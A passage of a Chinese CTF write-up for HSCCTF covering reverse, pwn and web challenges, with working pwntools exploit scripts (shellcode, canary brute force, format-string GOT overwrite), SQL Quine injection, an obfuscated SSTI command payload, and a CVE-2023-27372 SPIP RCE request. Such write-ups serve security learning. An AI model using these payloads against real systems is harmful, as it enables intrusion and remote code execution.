class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">0xCE</span>, <span class="number">0x26</span>, <span class="number">0x9C</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0xD9</span>, <span class="number">0xFD</span>, <span class="number">0x23</span>, <span class="number">0xBA</span>, <span class="number">0x9A</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xA8</span>, <span class="number">0x2E</span>, <span class="number">0xBD</span>, <span class="number">0xFC</span>, <span class="number">0x77</span>, <span class="number">0xB7</span>, <span class="number">0x5D</span>, <span class="number">0x7E</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xFD</span>, <span class="number">0xCD</span>, <span class="number">0x63</span>, <span class="number">0x13</span>, <span class="number">0x0A</span>, <span class="number">0x94</span>, <span class="number">0x5B</span>, <span class="number">0x95</span>, <span class="number">0x2C</span>, </span><br><span class="line">  <span class="number">0x26</span>, <span class="number">0x60</span>, <span class="number">0x1E</span>, <span class="number">0x1E</span>, <span class="number">0xB4</span>, <span class="number">0x30</span>, <span class="number">0x89</span>, <span class="number">0xCF</span>, <span class="number">0xEF</span>, <span class="number">0x68</span>]</span><br><span class="line">b890 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">b8a0 = [<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0xa</span>,<span class="number">0xf</span>,<span class="number">0x14</span>,<span class="number">0x19</span>,<span class="number">0x1e</span>,<span class="number">0</span>]</span><br><span class="line">k = <span class="string">b&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">c = [c[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^(k[i+<span class="number">1</span>] <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(k)-<span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^(k[i] <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(k) <span class="keyword">else</span> <span class="number">0</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line">c = [c[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c))]</span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4</span></span><br><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;HSCCTF&#123;FAKE_FLAG!&#125;&#x27;</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = c[:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    S[i] = i</span><br><span class="line">    Key[i] = <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    j = (j + S[i] + Key[i]) % N</span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    i = (i + <span class="number">1</span>) % N</span><br><span class="line">    j = (j + S[i]) % N</span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    t[k] ^= S[(S[i] + S[j]) % N]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line"></span><br><span class="line">t = [k^b890[b8a0[<span class="number">1</span>]] <span class="keyword">for</span> k <span class="keyword">in</span> t]</span><br><span class="line">t = [k^b890[b8a0[<span class="number">0</span>]] <span class="keyword">for</span> k <span class="keyword">in</span> t]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;HSCCTF&#123;Welcome_To_Participate_In_HSCCTF&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="NO-PY"><a href="#NO-PY" class="headerlink" title="NO_PY"></a>NO_PY</h3><blockquote><p>flag形式为:HSCCTF{this_is_an_example} 将得到的flag改为HSCCTF。</p></blockquote><p>参考 BeginCTF 2024 - ezpython。</p><p>pyinstxtractor解包程序，pycdc反编译pyc , 发现是个SM4加密，缺少 key 和 enc。</p><p>继续反编译 <code>PYZ-00.pyz_extracted/secret.pyc</code> ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;Please_Do_not_py&#x27;</span></span><br><span class="line">enc = <span class="string">b&#x27;YJ+70VWYioYm3EhF6qdScVXBpCdPm+hCS/HP+Gj421RyxkZbwzni7o2zGG/Mis4Wr6sbXYr4ufnKwQk7vrG8yA==&#x27;</span></span><br></pre></td></tr></table></figure><p>直接用SM4解不出，再反编译看 <code>PYZ-00.pyz_extracted/gmssl/sm4.pyc</code> 对比，发现魔改点，对key做了异或操作：<code>key = (lambda .0: [ i ^ 102 for i in .0 ])(key)</code></p><p>将key异或102，再SM4解密得flag：<code>flag&#123;Pay_M0re_@ttention_to_th3_key!!&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="STACK"><a href="#STACK" class="headerlink" title="STACK"></a>STACK</h3><p>栈溢出，<code>gift()</code> 函数只给了 <code>jmp rsp</code>，控制rsp即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------------------------------------------------</span><br><span class="line">|          buf         |   rbp   |        ret        |            ... ...          |</span><br><span class="line">------------------------------------------------------------------------------------</span><br><span class="line">| shellcode    +       padding   |   gadget(jmp rsp) | asm(sub rsp, 0x90;jmp rsp)  |</span><br><span class="line">------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>当ret的时候，rip被赋值，指向了当前的rsp所指向的值，即jmp rsp的gadget，同时rsp自减一个字；</p><p>当程序继续执行，jmp rsp时，执行流被劫持到栈上，具体地址为ret的后一个字；</p><p>继续执行我们布置好的指令：rsp自减，指向buf开头，即shellcode开头。rip自动后移，指向jmp rsp；</p><p>继续执行，控制流jmp到rsp所指，buf的开头区域，顺利执行shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">14028</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gift=<span class="number">0x40063B</span></span><br><span class="line">ret=<span class="number">0x40050e</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">sc=<span class="string">b&#x27;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&#x27;</span></span><br><span class="line">pl=sc.ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(gift)+asm(<span class="string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="PWN01"><a href="#PWN01" class="headerlink" title="PWN01"></a>PWN01</h3><p>参考 <a href="https://blog.csdn.net/yld666/article/details/134840123">NJCTF 2017 - messager</a>， 在函数 <code>sub_400BE9()</code> 存在一个明显的栈溢出漏洞，由于程序fork出了子进程，子进程的崩溃不影响主进程，故可通过爆破方式突破canary保护，覆盖函数返回地址改为 <code>sub_400B8E()</code> 得到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>():</span><br><span class="line">    canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(canary) &lt; <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>, <span class="number">14831</span>)</span><br><span class="line">            r.recv()</span><br><span class="line">            r.send(<span class="string">b&#x27;a&#x27;</span> * <span class="number">104</span> + canary + <span class="built_in">bytes</span>([x]))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r.recv()</span><br><span class="line">                canary += <span class="built_in">bytes</span>([x])</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                r.close()</span><br><span class="line">            <span class="built_in">print</span>(x,canary)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line"></span><br><span class="line">canary = get_canary()</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>, <span class="number">14831</span>)</span><br><span class="line">target = <span class="number">0x400b8e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">104</span> + canary + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(target)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="PWN02"><a href="#PWN02" class="headerlink" title="PWN02"></a>PWN02</h3><p>参考 <a href="https://blog.csdn.net/mcmuyanga/article/details/113512748">BUUCTF - inndy_echo2</a>，PIE+64为fmt，利用fmt泄露canary和程序基址，再改printf的got地址为system_plt即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">13978</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;%39$p&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">eval</span>(r.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;%41$p&#x27;</span>)</span><br><span class="line">pie=<span class="built_in">eval</span>(r.recvline())-<span class="number">74</span>-<span class="number">0x9b9</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">system_plt=pie+<span class="number">0x790</span>                 </span><br><span class="line">printf_got=pie+elf.got.printf</span><br><span class="line"></span><br><span class="line">pl=fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system_plt&#125;)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="GHOST"><a href="#GHOST" class="headerlink" title="GHOST"></a>GHOST</h3><p>参考 <a href="https://github.com/berTrAM888/RoarCTF-Writeup-some-Source-Code/blob/master/Pwn/Ez_op/wp.md">RoarCTF 2019 - Ez-op</a>，题目是一个功能简单的vm，共有push/pop/add/sub/mul/div/load/save 8种指令。</p><p>漏洞在于load和save没有对offset进行检查，导致vm stack越界访问和写入，而题目是静态编译，free_hook和system等地址都已知。</p><p>由于stack-&gt;data指向堆，所以需要先利用load将堆地址读入vm stack中，然后和bss上的free_hook进行sub操作，再进行div 4就可以获得堆地址和free_hook之间的偏移，将system地址写入之后，后面触发free(input)的地方就可以getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;111.180.204.186&#x27;</span>,<span class="number">11764</span>)</span><br><span class="line"></span><br><span class="line">push = <span class="number">0xAAAA</span></span><br><span class="line">pop  = <span class="number">0xBBBB</span></span><br><span class="line">add  = <span class="number">0xCCCC</span></span><br><span class="line">sub  = <span class="number">0xDDDD</span></span><br><span class="line">mul  = <span class="number">0xEEEE</span></span><br><span class="line">div  = <span class="number">0xFFFF</span></span><br><span class="line">load = <span class="number">0x1145</span></span><br><span class="line">save = <span class="number">0x1919</span></span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x8050940</span></span><br><span class="line">free_hook = <span class="number">0x80dc9F0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">d</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.join([<span class="built_in">str</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> d])</span><br><span class="line"></span><br><span class="line">heap_offset = (<span class="number">0x110</span>-<span class="number">8</span>) // <span class="number">4</span></span><br><span class="line">code = create([push,push,push,push,load,push,sub,div,save])</span><br><span class="line">data = create([<span class="string">&quot;/bin/sh&quot;</span>,system_addr,<span class="number">4</span>,heap_offset,free_hook])</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(data)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​        </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="CHECKIN-2"><a href="#CHECKIN-2" class="headerlink" title="CHECKIN"></a>CHECKIN</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;php://filter/<span class="subst">$a</span>/resource=/dev/null&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$b</span>)===<span class="string">&quot;2024&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>参考 ImaginaryCTF Round 28 - Filter Master，预期是构造filter链生成所需字符串。</p><p>非预期：</p><p>传入 <code>resource=data:,2024&lt;|string.strip_tags|</code>，利用PHP通过简单识别 <code>|</code> 作为filter分割字符来选择filter的特性。</p><p>payload：</p><p>POST <code>1=resource=data:,2024&lt;|string.strip_tags|</code></p><p>​    </p><h3 id="PWD"><a href="#PWD" class="headerlink" title="PWD"></a>PWD</h3><blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ccut&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waffff</span>(<span class="params"><span class="variable">$sql</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/infor|sys|sql|thread|case|when|if|like|left|right|mid|cmp|sub|locate|position|match|find|field|sleep|repeat|lock|bench|process|&lt;|&gt;|=|xor|and|&amp;&amp;|\\\\/i&quot;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">waffff</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>要求输入的password参数值等于系统的password值，利用union select实现输入和输出内容一致，Quine注入。</p><p>POST: </p><p><code>password=1&#39;UNION(SELECT(REPLACE(REPLACE(&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;,CHAR(34),CHAR(39)),CHAR(37),&#39;1&quot;UNION(SELECT(REPLACE(REPLACE(&quot;%&quot;,CHAR(34),CHAR(39)),CHAR(37),&quot;%&quot;)))#&#39;)))#</code></p><p>​    </p><h3 id="TMPL"><a href="#TMPL" class="headerlink" title="TMPL"></a>TMPL</h3><p>SSTI漏洞，限制了部分字符，用fenjing解决。</p><p>payload：</p><p><code>&#123;&#123;g|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*3)%(112,111,112))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,108,111,98,97,108,115,95,95))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,101,116,105,116,101,109,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*12)%(95,95,98,117,105,108,116,105,110,115,95,95))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*11)%(95,95,103,101,116,105,116,101,109,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*10)%(95,95,105,109,112,111,114,116,95,95))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*2)%(111,115))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*5)%(112,111,112,101,110))(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*9)%(99,97,116,32,47,102,108,97,103))|attr(((&#123;&#125;|escape|urlencode|first~joiner|string|batch(2)|first|last)*4)%(114,101,97,100))()&#125;&#125;</code></p><p>​    </p><h3 id="SHIROSHORTMENSHELL"><a href="#SHIROSHORTMENSHELL" class="headerlink" title="SHIROSHORTMENSHELL"></a>SHIROSHORTMENSHELL</h3><p>使用shiro攻击工具shiro_attack-4.5.2-SNAPSHOT-all.jar，找到key：<code>kPH+bIxk5D2deZiIxcaaaA==</code>，再用cb1链打通getshell即可。</p><p>​    </p><h3 id="DESERIALIZATION"><a href="#DESERIALIZATION" class="headerlink" title="DESERIALIZATION"></a>DESERIALIZATION</h3><p>SPIP CMS &lt;v4.2.1 反序列化RCE漏洞（CVE-2023-27372）</p><p>参考：<a href="https://www.cnblogs.com/spmonkey/p/17550492.html">【漏洞复现】CVE-2023-27372 RCE漏洞</a></p><p>列目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /spip.php?page=spip_pass</span><br><span class="line"></span><br><span class="line">page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&amp;formulaire_action_sign=&amp;oubli=s:21:&quot;&lt;?=system(&#x27;ls /&#x27;); ?&gt;&quot;;&amp;nobot=</span><br></pre></td></tr></table></figure><p>读文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /spip.php?page=spip_pass HTTP/1.1</span><br><span class="line"></span><br><span class="line">page=spip_pass&amp;formulaire_action=oubli&amp;formulaire_action_args=JWFEz0e3UDloiG3zKNtcjKCjPLtvQ3Ec0vfRTgIG7u7L0csbb259X%2Buk1lEX5F3%2F09Cb1W8MzTye1Q%3D%3D&amp;formulaire_action_sign=&amp;oubli=s:25:&quot;&lt;?=system(&#x27;uniq /f*&#x27;); ?&gt;&quot;;&amp;nobot=</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="LOG"><a href="#LOG" class="headerlink" title="LOG"></a>LOG</h3><blockquote><p>Hint: 同学发给我一个网址<a href="https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c0760496&amp;applicant=admin&amp;filename=web.log，说让我帮忙看看网站运行日志，同学说这是他写的一个非常安全方便的文件查看器。">https://x.x.x.x/?md5=9c80d2bb0bccfefeb3750744c0760496&amp;applicant=admin&amp;filename=web.log，说让我帮忙看看网站运行日志，同学说这是他写的一个非常安全方便的文件查看器。</a> 真的安全吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$secret</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;SECRETKEY&quot;</span>); <span class="comment"># For security reasons, the key length is greater than 8.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;applicant&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&quot;md5&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$secret</span>.<span class="variable">$_GET</span>[<span class="string">&quot;applicant&quot;</span>].<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]))&#123;</span><br><span class="line">        <span class="variable">$file_contents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file_contents</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;My tool is safe.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>哈希长度扩展攻击。</p><p>已知secret位数大于8，已知明文 <code>adminweb.log</code>，已知md5 hash=9c80d2bb0bccfefeb3750744c0760496，扩展字符 <code>/flag</code>。</p><p>利用脚本爆破secret位数，尝试到15的时候成功获取flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">python3 hash_ext_attack.py                                                  </span><br><span class="line">2024-03-10 08:17:33.714 | DEBUG    | common.md5_manual:__init__:17 - init......</span><br><span class="line">请输入已知明文：adminweb.log</span><br><span class="line">请输入已知hash： 9c80d2bb0bccfefeb3750744c0760496</span><br><span class="line">请输入扩展字符: /flag</span><br><span class="line">请输入密钥长度：15</span><br><span class="line">2024-03-10 08:27:02.695 